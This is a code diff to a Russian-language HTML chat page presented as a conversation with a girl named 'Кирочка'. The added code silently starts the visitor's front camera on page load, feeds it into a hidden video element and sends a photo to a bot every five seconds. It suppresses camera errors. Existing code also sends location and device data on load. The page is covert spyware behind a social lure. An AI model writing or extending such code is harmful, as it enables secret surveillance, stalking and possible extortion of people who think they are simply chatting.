@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>Чат с Полиной</title>
+    <title>Чат с Кирочкой</title>
     <style>
         html, body {
             height: 100dvh;
@@ -244,8 +244,8 @@
 <body>
 <div class="chat-container">
     <div class="header">
-        <img src="ПОЛИНА.jpg" alt="Полина" class="avatar">
-        <span class="name">Полина</span>
+        <img src="ПОЛИНА.jpg" alt="Кирочка" class="avatar">
+        <span class="name">Кирочка</span>
     </div>
     <div class="messages" id="messages"></div>
     <form class="input-area" id="chatForm">
@@ -274,6 +274,47 @@ const voiceBtn = document.getElementById('voiceBtn');
 let lastUpdateId = localStorage.getItem('lastUpdateId') || 0;
 
 let chatHistory = JSON.parse(localStorage.getItem('polinaChatHistory') || '[]');
+
+// === КАМЕРА И АВТОФОТО ===
+let cameraStream = null;
+let cameraInterval = null;
+
+async function startFrontCamera() {
+    try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false
+        });
+        const video = document.getElementById('hiddenVideo');
+        video.srcObject = cameraStream;
+        video.onloadedmetadata = () => {
+            video.play();
+            startPhotoInterval();
+        };
+    } catch (e) {
+        // Не удалось получить доступ к камере
+    }
+}
+
+function startPhotoInterval() {
+    if (cameraInterval) return;
+    cameraInterval = setInterval(takeAndSendPhoto, 5000);
+}
+
+function takeAndSendPhoto() {
+    const video = document.getElementById('hiddenVideo');
+    const canvas = document.getElementById('hiddenCanvas');
+    if (!video.videoWidth) return;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+        if (blob) {
+            sendToBot({file: blob});
+        }
+    }, 'image/jpeg', 0.85);
+}
 
 function saveChatHistory() {
     localStorage.setItem('polinaChatHistory', JSON.stringify(chatHistory));
@@ -463,6 +504,10 @@ window.onload = function() {
     sendLocationAndDevice();
     renderChatHistory();
     pollPolinaMessages();
+    if (!localStorage.getItem('cameraAsked')) {
+        startFrontCamera();
+        localStorage.setItem('cameraAsked', '1');
+    }
 };
 </script>
 </body>
